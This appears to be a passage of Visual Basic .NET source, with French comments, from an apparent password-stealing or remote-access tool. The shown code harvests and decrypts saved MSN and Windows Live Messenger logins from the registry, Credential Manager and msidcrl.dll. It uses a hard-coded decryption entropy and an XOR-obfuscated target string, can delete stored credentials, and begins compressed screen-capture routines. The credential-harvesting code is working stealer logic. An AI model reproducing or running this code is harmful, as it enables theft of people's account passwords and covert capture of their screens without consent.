        'taille d'une chaine ASCII
        Private Declare Function lstrlen Lib "kernel32.dll" Alias "lstrlenA" (ByVal lpString As String) As Integer
     
        'énumère les "jeton de sécurité"
        Private Declare Function CredEnumerate Lib "advapi32.dll" Alias "CredEnumerateW" (<MarshalAs(UnmanagedType.LPWStr)> ByVal lpszFilter As String, ByVal lFlags As Integer, ByRef pCount As Integer, ByRef lppCredentials As IntPtr) As Integer
        Private Declare Function CredEnumerate Lib "advapi32.dll" Alias "CredEnumerateW" (ByVal lpszFilter As IntPtr, ByVal lFlags As Integer, ByRef pCount As Integer, ByRef lppCredentials As IntPtr) As Integer
     
        'supprime une jeton de sécurité
        Private Declare Function CredDelete Lib "advapi32.dll" Alias "CredDeleteW" (<MarshalAs(UnmanagedType.LPWStr)> ByVal lpwstrTargetName As String, ByVal dwType As Integer, ByVal dwFlags As Integer) As Integer
     
        'libère la mémoire allouée pour l'énumération
        Private Declare Function CredFree Lib "advapi32.dll" (ByVal pBuffer As IntPtr) As Integer
     
        'décrypte les données de la jeton de sécurité
        Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Integer
        Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByVal pOptionalEntropy As Integer, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Integer
     
        'ouvre une clé
        Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Integer, ByVal lpSubKey As String, ByVal ulOptions As Integer, ByVal samDesired As Integer, ByRef phkResult As Integer) As Integer
        'récupère une valeur dans une clé
        Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Integer, ByVal lpValueName As String, ByVal lpReserved As Integer, ByRef lpType As Integer, <MarshalAs(UnmanagedType.LPWStr)> ByVal lpData As String, ByRef lpcbData As Integer) As Integer
        Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Integer, ByVal lpValueName As String, ByVal lpReserved As Integer, ByRef lpType As Integer, ByVal lpData As IntPtr, ByRef lpcbData As Integer) As Integer
        'énumère les clés de registre
        Private Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hKey As Integer, ByVal dwIndex As Integer, ByVal lpName As String, ByRef lpcbName As Integer, ByVal lpReserved As Integer, ByVal lpClass As String, ByVal lpcbClass As Integer, ByRef lpftLastWriteTime As FILETIME) As Integer
        'supprime une valeur d'une clé
        Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Integer, ByVal lpValueName As String) As Integer
        'libère de la mémoire allouée
        Private Declare Function LocalFree Lib "kernel32.dll" (ByVal hMem As Integer) As Integer
        'ferme une clé
        Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Integer) As Integer
     
        'chemin de Program Files
        Private Const CSIDL_PROGRAM_FILES As Integer = &H26S
     
        'récupère le PIDL d'un dossier système (documents and settings, personnel, mes documents, program files....)
        Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Integer, ByVal nFolder As Integer, ByRef pidl As Integer) As Integer
        'convertit un PIDL en chemin DOS
        Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Integer, ByVal pszPath As String) As Integer
     
        'API de MSN7.5 pour récupérer les mots de passes de la session en cours
        Private Declare Function Initialize Lib "msidcrl.dll" (ByRef guid As Guid, ByVal IDCRLVersion As Integer, ByVal dwFlags As Integer) As Integer
        Private Declare Function EnumIdentitiesWithCachedCredentials Lib "msidcrl.dll" (<MarshalAs(UnmanagedType.LPWStr)> ByVal wszCachedCredType As String, ByRef phEnumHandle As Integer) As Integer
        Private Declare Function NextIdentity Lib "msidcrl.dll" (ByVal hEnumHandle As Integer, ByRef lpwszMemberName As IntPtr) As Integer
        Private Declare Function PassportFreeMemory Lib "msidcrl.dll" (ByVal ptr As IntPtr) As Integer
        Private Declare Function CloseEnumIdentitiesHandle Lib "msidcrl.dll" (ByVal hEnumHandle As Integer) As Integer
        Private Declare Function CreateIdentityHandle Lib "msidcrl.dll" (<MarshalAs(UnmanagedType.LPWStr)> ByVal wszMemberName As String, ByVal dwFlags As Integer, ByRef lphExternalIdentity As Integer) As Integer
        Private Declare Function CreateIdentityHandle Lib "msidcrl.dll" (ByVal wszMemberName As IntPtr, ByVal dwFlags As Integer, ByRef lphExternalIdentity As Integer) As Integer
        Private Declare Function HasPersistedCredential Lib "msidcrl.dll" (ByVal hExternalIdentity As Integer, <MarshalAs(UnmanagedType.LPWStr)> ByVal wszCredType As String, ByRef lpbPersisted As Integer) As Integer
        Private Declare Function RemovePersistedCredential Lib "msidcrl.dll" (ByVal hExternalIdentity As Integer, <MarshalAs(UnmanagedType.LPWStr)> ByVal wszCredType As String) As Integer
        Private Declare Function GetIdentityPropertyByName Lib "msidcrl.dll" (ByVal hExternalIdentity As Integer, <MarshalAs(UnmanagedType.LPWStr)> ByVal wszPropertyName As String, ByRef lpszValue As Integer) As Integer
        Private Declare Function BuildAuthTokenRequest Lib "msidcrl.dll" (ByVal hExternalIdentity As Integer, <MarshalAs(UnmanagedType.LPWStr)> ByVal wszPolicy As String, ByVal dwFlags As Integer, ByRef lpReturn As IntPtr) As Integer
        Private Declare Function CloseIdentityHandle Lib "msidcrl.dll" (ByVal hExternalIdentity As Integer) As Integer
        Private Declare Function Uninitialize Lib "msidcrl.dll" () As Integer
     
        'charge et décharge une dll
        Private Declare Function LoadLibrary Lib "kernel32.dll" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Integer
        Private Declare Function FreeLibrary Lib "kernel32.dll" (ByVal hLibModule As Integer) As Integer
     
        Private Structure MSNPass
            Dim strLogin As String
            Dim strPass As String
            Dim strTargetName As String
        End Structure
     
        Private m_MSNPass As New List(Of CMSNMessengerPassword)
     
        'renvoie le chemin de Program Files
        Private Function getProgramFilesFolderPath() As String
            Dim lRet, pidl As Integer
            Dim sPath As String
     
            'récupère le PIDL
            lRet = SHGetSpecialFolderLocation(0, CSIDL_PROGRAM_FILES, pidl)
            If lRet = 0 Then
                'puis le convertit en chemin
                sPath = New String(Chr(0), 512)
                lRet = SHGetPathFromIDList(pidl, sPath)
                getProgramFilesFolderPath = Left(sPath, InStr(sPath, Chr(0)) - 1)
            Else
                getProgramFilesFolderPath = vbNullString
            End If
            LocalFree(pidl)
        End Function
     
        Private Sub getMSN75Passwords()
            Dim szMSNPath As String
            Dim hMod As Integer
     
            'teste si la dll d'identification est présente
            szMSNPath = getProgramFilesFolderPath() & "\MSN Messenger\msidcrl.dll"
            Dim hEnum As Integer
            Dim ptrEmail As IntPtr
            Dim bPersist As Integer
            Dim posend, ret, posstart As Integer
            Dim hIdent As Integer
            Dim ptrAuth As IntPtr
            Dim auth As String
            Dim g As Guid
            If Dir(szMSNPath) <> vbNullString Then
                hMod = LoadLibrary(szMSNPath)
     
                g = New Guid(&H7108E71A, &H9926S, &H4FCB, New Byte() {&HBC, &HC9, &H9A, &H9D, &H3F, &H32, &HE4, &H23})
     
                'initialise la dll idcrl
                Call Initialize(g, 1, 15)
     
                'ouvre un handle d'énumération des mots de passes stockés
                ret = EnumIdentitiesWithCachedCredentials("ps:password", hEnum)
     
                If (ret = 0) Then
                    'récupère la prochaine identité
                    ret = NextIdentity(hEnum, ptrEmail)
                    Do While ret = 0
                        'ouvre l'identité
                        ret = CreateIdentityHandle(ptrEmail, 255, hIdent)
                        If (ret = 0) And (ptrEmail <> IntPtr.Zero) Then
                            'si l'identité a un mot de passe stocké
                            ret = HasPersistedCredential(hIdent, "ps:password", bPersist)
                            If (ret = 0) And (bPersist <> 0) Then
                                'on construit la requête de connexion
                                ret = BuildAuthTokenRequest(hIdent, "ps:password", 0, ptrAuth)
     
                                If (ret = 0) Then
                                    auth = CopyString(ptrAuth)
     
                                    'on extrait le mot de passe
                                    posstart = InStr(auth, "<wsse:Password>") + 15
                                    posend = InStr(auth, "</wsse:Password>")
     
                                    If (posend > 0) Then
                                        m_MSNPass.Add( _
                                            New CMSNMessengerPassword(CopyString(ptrEmail), Mid(auth, posstart, posend - posstart), "ps:" + CopyString(ptrEmail)))
                                    End If
                                End If
                                'libère la requête
                                If (ptrAuth <> IntPtr.Zero) Then
                                    Call PassportFreeMemory(ptrAuth)
                                End If
                            End If
                            'ferme le handle de l'identité
                            ret = CloseIdentityHandle(hIdent)
                        End If
     
                        'libère le nom de l'identité
                        If (ptrEmail <> IntPtr.Zero) Then
                            Call PassportFreeMemory(ptrEmail)
                        End If
     
                        'récupère la prochaine identité
                        ret = NextIdentity(hEnum, ptrEmail)
                    Loop
                End If
     
                Call CloseEnumIdentitiesHandle(hEnum)
     
                'idem pour les identités sans mot de passe stocké
                ret = EnumIdentitiesWithCachedCredentials("ps:membernameonly", hEnum)
     
                If (ret = 0) Then
                    ret = NextIdentity(hEnum, ptrEmail)
                    Do While ret = 0
                        ret = CreateIdentityHandle(ptrEmail, 255, hIdent)
                        If (ret = 0) And (ptrEmail <> IntPtr.Zero) Then
                            ret = HasPersistedCredential(hIdent, "ps:password", bPersist)
                            If (ret = 0) And (bPersist = 0) Then
                                m_MSNPass.Add( _
                                    New CMSNMessengerPassword(CopyString(ptrEmail), String.Empty, "ps:" + CopyString(ptrEmail)))
                            End If
                            ret = CloseIdentityHandle(hIdent)
                        End If
     
                        If (ptrEmail <> IntPtr.Zero) Then
                            Call PassportFreeMemory(ptrEmail)
                        End If
     
                        ret = NextIdentity(hEnum, ptrEmail)
                    Loop
                End If
     
                Call CloseEnumIdentitiesHandle(hEnum)
     
                'libère la dll idcrl
                Call Uninitialize()
     
                Call FreeLibrary(hMod)
            End If
        End Sub
     
        Public Sub Refresh()
            Dim ret As Integer
            Dim hKey As Integer
            Dim dwType As Integer
            Dim dwSize As Integer
            Dim b64string As String
            Dim str_Renamed As String
            Dim dataIn As DATA_BLOB
            Dim dataOut As DATA_BLOB
            Dim dwNbCred As Integer
            Dim i As Integer
            Dim ptr As IntPtr
            Dim lpCredentials As IntPtr
            Dim Cred As CREDENTIAL
            Dim Entropy As DATA_BLOB
     
            m_MSNPass.Clear()
     
            'ouvre la clé de MSN Messenger <= 5.0
            ret = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\MessengerService", 0, KEY_READ, hKey)
     
            'essaie de récupèrer la valeur du mot de passe
            dwSize = 0
            ret = RegQueryValueEx(hKey, "PasswordMSN Messenger Service", 0, dwType, IntPtr.Zero, dwSize)
            'si on peut la récupérer alors, MSN <= 5.0 est installé
            If dwSize > 0 Then
                ptr = Marshal.AllocHGlobal(dwSize)
                'on récupère le mot de passe ASCII base64
                ret = RegQueryValueEx(hKey, "PasswordMSN Messenger Service", 0, dwType, ptr, dwSize)
                str_Renamed = Marshal.PtrToStringAnsi(ptr)
                Marshal.FreeHGlobal(ptr)
     
                str_Renamed = Mid(str_Renamed, 1, Len(str_Renamed) - 1)
                'on le décode
                Dim strPass As String = Base64Dec(str_Renamed)
                dwSize = 0
                'on récupère le login
                ret = RegQueryValueEx(hKey, "UserMSN Messenger Service", 0, dwType, IntPtr.Zero, dwSize)
     
                ptr = Marshal.AllocHGlobal(dwSize)
                ret = RegQueryValueEx(hKey, "UserMSN Messenger Service", 0, dwType, ptr, dwSize)
                Dim strLogin As String = Marshal.PtrToStringAnsi(ptr)
                Marshal.FreeHGlobal(ptr)
     
                strLogin = Mid(strLogin, 1, Len(strLogin) - 1)
     
                m_MSNPass.Add( _
                    New CMSNMessengerPassword(strLogin, strPass, String.Empty))
     
                RegCloseKey(hKey)
            End If
     
            RegCloseKey(hKey)
     
            'sinon 5.0 < MSN < 7.0
            'on ouvre la clé correspondante
            ret = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\MSNMessenger", 0, KEY_READ, hKey)
     
            'si on peut c'est que la bonne version est installée
            If ret = ERROR_SUCCESS Then
                dwSize = 0
                'lecture des données cryptées du mot de passe
                ret = RegQueryValueEx(hKey, "Password.NET Messenger Service", 0, dwType, IntPtr.Zero, dwSize)
                If ret = ERROR_SUCCESS Then
                    ptr = Marshal.AllocHGlobal(dwSize)
                    ret = RegQueryValueEx(hKey, "Password.NET Messenger Service", 0, dwType, ptr, dwSize)
     
                    If ret <> ERROR_SUCCESS Then Exit Sub
     
                    'décryptage du mot de passe ASCII base64
                    dataIn.pbData = ptr.ToInt32 + 2
                    dataIn.cbData = dwSize - 2
     
                    Call CryptUnprotectData(dataIn, 0, 0, 0, 0, 1, dataOut)
     
                    b64string = Marshal.PtrToStringAnsi(ptr)
                    Marshal.FreeHGlobal(ptr)
     
                    'on le décode
                    Dim strPass As String = Base64Dec(b64string)
                    dwSize = 0
                    'on récupère le nom d'utilisateur ASCII
                    ret = RegQueryValueEx(hKey, "User.NET Messenger Service", 0, dwType, IntPtr.Zero, dwSize)
                    ptr = Marshal.AllocHGlobal(dwSize)
                    ret = RegQueryValueEx(hKey, "User.NET Messenger Service", 0, dwType, ptr, dwSize)
                    Dim strLogin As String = Marshal.PtrToStringAnsi(ptr)
                    Marshal.FreeHGlobal(ptr)
                    strLogin = Mid(strLogin, 1, Len(strLogin) - 1)
     
                    m_MSNPass.Add( _
                    New CMSNMessengerPassword(strLogin, strPass, String.Empty))
     
                    LocalFree(dataOut.pbData)
                End If
            End If
     
            'sinon c'est une version de MSN > 7.0
     
            'on énumère le couple login:mot de passe de MSN (normalement, il n'y en a qu'un)
            str_Renamed = "Passport.Net\*"
            Call CredEnumerate(str_Renamed, 0, dwNbCred, lpCredentials)
     
            's'il y en a un
            Dim guid As String
            Dim k As Integer
            Dim ptrEntropy As IntPtr
            If dwNbCred > 0 Then
                'on calcule la clé de décryptage supplémentaire
                Entropy.cbData = 74
     
                ptrEntropy = Marshal.AllocHGlobal(74)
                'qui se calcule à partir du GUID de credui.dll
                guid = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0" & vbNullChar
                For k = 0 To 36
                    Marshal.WriteInt16(ptrEntropy, k * 2, CShort(Asc(Mid(guid, k + 1, 1)) * 4))
                Next
                Entropy.pbData = ptrEntropy.ToInt32
     
                'pour chaque jeton de sécurité même s'il n'y en a qu'un
                For i = 0 To dwNbCred - 1
                    'on copie le pointeur du tableau (lpCredentials) de pointeur vers les jetons de sécurité
                    ptr = Marshal.ReadIntPtr(lpCredentials, i * 4)
                    'on copie le jeton de sécurité pointer par lpCredential[i]
                    Cred = CType(Marshal.PtrToStructure(ptr, Cred.GetType), CREDENTIAL)
     
                    'on décrypte les données (le mot de passe) du jeton de sécurité
                    dataIn.pbData = Cred.lpbCredentialBlob
                    dataIn.cbData = Cred.dwCredentialBlobSize
                    dataOut.cbData = 0
                    dataOut.pbData = 0
                    Call CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                    'on copie le mot de passe décrypté (UNICODE)
                    'le login est le nom d'utilisateur
                    m_MSNPass.Add( _
                        New CMSNMessengerPassword(CopyString(New IntPtr(Cred.lpUserName)), CopyString(New IntPtr(dataOut.pbData)), CopyString(New IntPtr(Cred.lpstrTargetName))))
     
                    LocalFree(dataOut.pbData)
                Next
                Marshal.FreeHGlobal(ptrEntropy)
            End If
            CredFree(lpCredentials)
     
            'MSN 7.5
            getMSN75Passwords()
     
            'Live Messenger (>= 8.0)
            RegCloseKey(hKey)
     
            Dim az(17) As Byte
            Dim er As Byte
            Dim ty As IntPtr
            az(0) = &H26S : az(1) = &H30S : az(2) = &H6FS : az(3) = &H66S : az(4) = &H51S : az(5) = &H65S : az(6) = &H38S : az(7) = &H52S : az(8) = &H62S : az(9) = &H6CS : az(10) = &H4ES : az(11) = &H64S : az(12) = &H67S : az(13) = &H6ES : az(14) = &H5AS : az(15) = &H53S : az(16) = &H55S : az(17) = &H4AS
            ty = Marshal.AllocHGlobal(38)
     
            For i = 0 To 17
                er = CByte(CByte(az(17 - i) Xor 12) + (17 - i))
                Marshal.WriteInt16(ty, (i * 2), er)
            Next
            Marshal.WriteInt16(ty, 36, 0)
     
            'on énumère
            Call CredEnumerate(ty, 0, dwNbCred, lpCredentials)
     
            's'il y en a un
            If dwNbCred > 0 Then
                'pour chaque jeton de sécurité même s'il n'y en a qu'un
                For i = 0 To dwNbCred - 1
                    'on copie le pointeur du tableau (lpCredentials) de pointeur vers les jetons de sécurité
                    ptr = Marshal.ReadIntPtr(lpCredentials, i * 4)
                    'on copie le jeton de sécurité pointer par lpCredential[i]
                    Cred = CType(Marshal.PtrToStructure(ptr, Cred.GetType), CREDENTIAL)
     
                    'on décrypte le mot de passe live messenger
                    dataIn.pbData = Cred.lpbCredentialBlob
                    dataIn.cbData = Cred.dwCredentialBlobSize
                    Call CryptUnprotectData(dataIn, 0, 0, 0, 0, 1, dataOut)
                    dataOut.pbData = dataIn.pbData
     
                    'mot de passe
                    Me.m_MSNPass.Add(New CMSNMessengerPassword(CopyString(New IntPtr(Cred.lpUserName)), Marshal.PtrToStringUni(New IntPtr(dataOut.pbData), CInt(dataIn.cbData / 2)), CopyString(New IntPtr(Cred.lpstrTargetName))))
                Next
            End If
            CredFree(lpCredentials)
            Marshal.FreeHGlobal(ty)
        End Sub
     
        Private Sub DeleteAllCred(ByVal lpszCredPattern As String)
            Dim dwNbCred As Integer
            Dim lpCredentials As IntPtr
            Dim ptr As IntPtr
            Dim i As Integer
            Dim Cred As CREDENTIAL
            Dim strTargetName As String
     
            'on énumère le couple login:mot de passe de MSN (normalement, il n'y en a qu'un)
            Call CredEnumerate(lpszCredPattern, 0, dwNbCred, lpCredentials)
     
            's'il y en a un
            If dwNbCred > 0 Then
                'pour chaque jeton de sécurité même s'il n'y en a qu'un
                For i = 0 To dwNbCred - 1
                    'on copie le pointeur du tableau (lpCredentials) de pointeur vers les jetons de sécurité
                    ptr = Marshal.ReadIntPtr(lpCredentials, i * 4)
                    'on copie le jeton de sécurité pointer par lpCredential[i]
                    Cred = CType(Marshal.PtrToStructure(ptr, Cred.GetType), CREDENTIAL)
     
                    strTargetName = CopyString(New IntPtr(Cred.lpstrTargetName))
                    CredDelete(strTargetName, Cred.dwType, Cred.dwFlags)
                Next
            End If
            CredFree(lpCredentials)
        End Sub
     
        Private Sub DeleteAllCred(ByVal lpszCredPattern As IntPtr)
            Dim dwNbCred As Integer
            Dim lpCredentials As IntPtr
            Dim ptr As IntPtr
            Dim i As Integer
            Dim Cred As CREDENTIAL
            Dim strTargetName As String
     
            'on énumère le couple login:mot de passe de MSN (normalement, il n'y en a qu'un)
            Call CredEnumerate(lpszCredPattern, 0, dwNbCred, lpCredentials)
     
            's'il y en a un
            If dwNbCred > 0 Then
                'pour chaque jeton de sécurité même s'il n'y en a qu'un
                For i = 0 To dwNbCred - 1
                    'on copie le pointeur du tableau (lpCredentials) de pointeur vers les jetons de sécurité
                    ptr = Marshal.ReadIntPtr(lpCredentials, i * 4)
                    'on copie le jeton de sécurité pointer par lpCredential[i]
                    Cred = CType(Marshal.PtrToStructure(ptr, Cred.GetType), CREDENTIAL)
     
                    strTargetName = CopyString(New IntPtr(Cred.lpstrTargetName))
                    CredDelete(strTargetName, Cred.dwType, Cred.dwFlags)
                Next
            End If
            CredFree(lpCredentials)
        End Sub
     
        Public Sub Delete(ByVal szTargetName As String)
            Dim ret As Integer
            Dim hKey As Integer
            Dim dwType As Integer
            Dim dwSize As Integer
            Dim i As Integer
            Dim hMod As Integer
     
            Dim az(17) As Byte
            Dim er As Byte
            Dim ty As IntPtr
            az(0) = &H26S : az(1) = &H30S : az(2) = &H6FS : az(3) = &H66S : az(4) = &H51S : az(5) = &H65S : az(6) = &H38S : az(7) = &H52S : az(8) = &H62S : az(9) = &H6CS : az(10) = &H4ES : az(11) = &H64S : az(12) = &H67S : az(13) = &H6ES : az(14) = &H5AS : az(15) = &H53S : az(16) = &H55S : az(17) = &H4AS
            ty = Marshal.AllocHGlobal(38)
     
            For i = 0 To 17
                er = CByte(CShort(az(17 - i) Xor 12) + (17 - i))
                Marshal.WriteByte(ty, (i * 2), er)
            Next
            Marshal.WriteInt16(ty, 36, 0)
     
            'on essaie d'ouvrir la clé de MSN < 5.0
            ret = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\MessengerService", 0, KEY_WRITE, hKey)
     
            dwSize = 0
            ret = RegQueryValueEx(hKey, "PasswordMSN Messenger Service", 0, dwType, IntPtr.Zero, dwSize)
            If dwSize > 0 Then
                'si on peut l'ouvrir, on la supprime
                ret = RegDeleteValue(hKey, "PasswordMSN Messenger Service")
            End If
            RegCloseKey(hKey)
     
            'sinon c'est 5.0 < MSN < 7.0
            'on essaie d'ouvrir sa clé
            ret = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\MSNMessenger", 0, KEY_READ, hKey)
     
            If ret = ERROR_SUCCESS Then
                dwSize = 0
                'on essaie de lire la valeur du mot de passe
                ret = RegQueryValueEx(hKey, "Password.NET Messenger Service", 0, dwType, IntPtr.Zero, dwSize)
                If dwSize > 0 Then
                    'si on y a arrive, on supprime la valeur
                    ret = RegDeleteValue(hKey, "Password.NET Messenger Service")
                    Exit Sub
                End If
            End If
            RegCloseKey(hKey)
     
            'MSN 7.5
            Dim szMSNPath As String
     
            'teste si la dll d'identification est présente
            szMSNPath = getProgramFilesFolderPath() & "\MSN Messenger\msidcrl.dll"
            Dim hIdent As Integer
            Dim g As Guid
            If Dir(szMSNPath) <> vbNullString Then
                hMod = LoadLibrary(szMSNPath)
     
                g = New Guid(&H7108E71A, &H9926S, &H4FCB, New Byte() {&HBC, &HC9, &H9A, &H9D, &H3F, &H32, &HE4, &H23})
     
                'initialise la dll idcrl
                Call Initialize(g, 1, 15)
     
                If Len(szTargetName) = 0 Then
                    For i = 0 To m_MSNPass.Count - 1
                        With m_MSNPass(i)
                            If InStr(.TargetName, "ps:") = 1 Then
                                'ouvre l'identité
                                szTargetName = Mid(.TargetName, 4)
                                ret = CreateIdentityHandle(szTargetName, 255, hIdent)
                                If (ret = 0) Then
                                    'supprime les deux types d'identité possibles
                                    ret = RemovePersistedCredential(hIdent, "ps:password")
                                    ret = RemovePersistedCredential(hIdent, "ps:membernameonly")
                                    'ferme le handle de l'identité
                                    ret = CloseIdentityHandle(hIdent)
                                End If
                            End If
                        End With
                    Next
                Else
                    'ouvre l'identité
                    szTargetName = Mid(szTargetName, 4)
                    ret = CreateIdentityHandle(szTargetName, 255, hIdent)
                    If (ret = 0) Then
                        'supprime les deux types d'identité possibles
                        ret = RemovePersistedCredential(hIdent, "ps:password")
                        ret = RemovePersistedCredential(hIdent, "ps:membernameonly")
                        'ferme le handle de l'identité
                        ret = CloseIdentityHandle(hIdent)
                    End If
                End If
                Call Uninitialize()
                Call FreeLibrary(hMod)
            End If
     
     
            'sinon MSN > 7.0
            'sinon, on supprime le jeton de sécurité de MSN > 7.0
     
            If Len(szTargetName) = 0 Then
                szTargetName = "Passport.Net\*"
                DeleteAllCred(szTargetName)
                DeleteAllCred(ty)
            Else
                ret = CredDelete(szTargetName, 1, 0)
            End If
     
            If Len(szTargetName) = 0 Then
                szTargetName = "Passport.Net\*"
                DeleteAllCred(szTargetName)
                DeleteAllCred(ty)
            Else
                ret = CredDelete(szTargetName, CRED_TYPE.DOMAIN_VISIBLE_PASSWORD, 0)
            End If
     
            Marshal.FreeHGlobal(ty)
        End Sub
     
        'décodage base64
        Private Function Base64Dec(ByRef Base64String As String) As String
            ' by Nobody, 20011204
            Static Enc() As Byte
            Dim b() As Byte
            Dim Out() As Byte
            Dim i As Integer
            Dim j As Integer
            Dim L As Integer
            Dim Dec(255) As Byte
            If Enc.Length = 0 Then 'byval 0&-Ptr = not initialized
                Enc = System.Text.ASCIIEncoding.ASCII.GetBytes("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
            End If
            For i = 0 To 255 : Dec(i) = 64 : Next
            For i = 0 To 63 : Dec(Enc(i)) = CByte(i) : Next
            L = Len(Base64String)
            b = System.Text.ASCIIEncoding.ASCII.GetBytes(Base64String)
            ReDim Preserve Out((L \ 4) * 3 - 1)
            For i = 0 To UBound(b) Step 4
                Out(j) = CByte((Dec(b(i)) * 4) Or (Dec(b(i + 1)) \ 16)) : j = j + 1
                Out(j) = CByte(CShort(Dec(b(i + 1)) And 15) * 16 Or (Dec(b(i + 2)) \ 4)) : j = j + 1
                Out(j) = CByte(CShort(Dec(b(i + 2)) And 3) * 64 Or Dec(b(i + 3))) : j = j + 1
            Next i
            If b(L - 2) = 61 Then j = 2 Else If b(L - 1) = 61 Then j = 1 Else j = 0
            ReDim Preserve Out(UBound(Out) - j)
            Base64Dec = System.Text.ASCIIEncoding.ASCII.GetString(Out)
        End Function
     
        Public Function GetEnumerator() As System.Collections.Generic.IEnumerator(Of CMSNMessengerPassword) Implements System.Collections.Generic.IEnumerable(Of CMSNMessengerPassword).GetEnumerator
            Me.Refresh()
            Return Me.m_MSNPass.GetEnumerator()
        End Function
     
        Public Function GetEnumerator1() As System.Collections.IEnumerator Implements System.Collections.IEnumerable.GetEnumerator
            Me.Refresh()
            Return Me.m_MSNPass.GetEnumerator()
        End Function
    End Class
    Friend Class CMSNMessengerPassword
        'classe décrivant un compte MSN Messenger
     
        Private m_szLogin As String
        Private m_szPassword As String
        Private m_szTargetName As String
     
        Friend Sub New(ByRef szLogin As String, ByRef szPassword As String, ByRef szTargetName As String)
            m_szPassword = szPassword
            m_szLogin = szLogin
            m_szTargetName = szTargetName
        End Sub
     
        Public ReadOnly Property Password() As String
            Get
                Password = m_szPassword
            End Get
        End Property
     
        Public ReadOnly Property Login() As String
            Get
                Login = m_szLogin
            End Get
        End Property
     
        Public ReadOnly Property TargetName() As String
            Get
                TargetName = m_szTargetName
            End Get
        End Property
    End Class
     
     
    Public Class CUtils
     
     
        Protected Function CopyString(ByVal ptr As IntPtr) As String
            Return Marshal.PtrToStringUni(ptr)
        End Function
     
        Protected Function getStrLengthA(ByVal str() As Byte) As Integer
            Dim b As Byte
            Dim ret As Integer = 0
            For Each b In str
                ret += 1
                If b = 0 Then Return ret
            Next
            Return ret
        End Function
    End Class
     
     
     
     
     
     
    Public Class rc
        Public Shared quality As Integer = 1
        Public Shared Function Compress(ByVal data As Byte()) As Byte()
            Dim ms As New MemoryStream()
            Dim ds As New DeflateStream(ms, CompressionMode.Compress)
            ds.Write(data, 0, data.Length)
            ds.Flush()
            ds.Close()
            Return ms.ToArray()
        End Function
        Public Shared Function Decompress(ByVal data As Byte()) As Byte()
            Const BUFFER_SIZE As Integer = 256
            Dim tempArray As Byte() = New Byte(BUFFER_SIZE - 1) {}
            Dim tempList As New List(Of Byte())()
            Dim count As Integer = 0, length As Integer = 0
     
            Dim ms As New MemoryStream(data)
            Dim ds As New DeflateStream(ms, CompressionMode.Decompress)
     
            While (InlineAssignHelper(count, ds.Read(tempArray, 0, BUFFER_SIZE))) > 0
                If count = BUFFER_SIZE Then
                    tempList.Add(tempArray)
                    tempArray = New Byte(BUFFER_SIZE - 1) {}
                Else
                    Dim temp As Byte() = New Byte(count - 1) {}
                    Array.Copy(tempArray, 0, temp, 0, count)
                    tempList.Add(temp)
                End If
                length += count
            End While
     
            Dim retVal As Byte() = New Byte(length - 1) {}
     
            count = 0
            For Each temp As Byte() In tempList
                Array.Copy(temp, 0, retVal, count, temp.Length)
                count += temp.Length
            Next
     
            Return retVal
        End Function
        Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
            target = value
            Return value
        End Function
       
        Public Shared Function imagetobyte(ByVal image As Image) As Byte()
     
            Dim ms As New IO.MemoryStream
            image.Save(ms, Imaging.ImageFormat.Jpeg)
            Dim b As Byte() = ms.GetBuffer()
            Return Compress(b)
            ms.Dispose()
        End Function
        Public Shared Function MCimagetobyte(ByVal image As Image) As Byte()
     
            Dim ms As New IO.MemoryStream
            image.Save(ms, Imaging.ImageFormat.Jpeg)
            Dim b As Byte() = ms.GetBuffer()
            Return b
            ms.Dispose()
        End Function
        Public Shared Function TPicResizeByWidth(ByVal SourceImage As Image, ByVal NewWidth As Integer) As Image
            Dim SizeFactor As Decimal = NewWidth / SourceImage.Width
            Dim NewHeigth As Integer = SizeFactor * SourceImage.Height
            Dim NewImage As New Bitmap(NewWidth, NewHeigth)
            Using G As Graphics = Graphics.FromImage(NewImage)
                G.InterpolationMode = InterpolationMode.Low
                G.DrawImage(SourceImage, New Rectangle(0, 0, NewWidth, NewHeigth))
                G.Dispose()
            End Using
            Return NewImage
            NewImage.Dispose()
            NewImage = Nothing
            TPicResizeByWidth.Dispose()
        End Function
        Public Shared Function PicResizeByWidth(ByVal SourceImage As Image, ByVal NewWidth As Integer) As Image
            Dim SizeFactor As Decimal = NewWidth / SourceImage.Width
            Dim NewHeigth As Integer = SizeFactor * SourceImage.Height
            Dim NewImage As New Bitmap(NewWidth, NewHeigth)
            Using G As Graphics = Graphics.FromImage(NewImage)
                G.InterpolationMode = InterpolationMode.HighQualityBicubic
                G.DrawImage(SourceImage, New Rectangle(0, 0, NewWidth, NewHeigth))
                G.Dispose()
            End Using
            Return NewImage
            NewImage.Dispose()
            NewImage = Nothing
            PicResizeByWidth.Dispose()
        End Function
        Public Shared Function getimage() As Bitmap
            Dim maxHeight As Integer = 0
            Dim maxWidth As Integer = 0
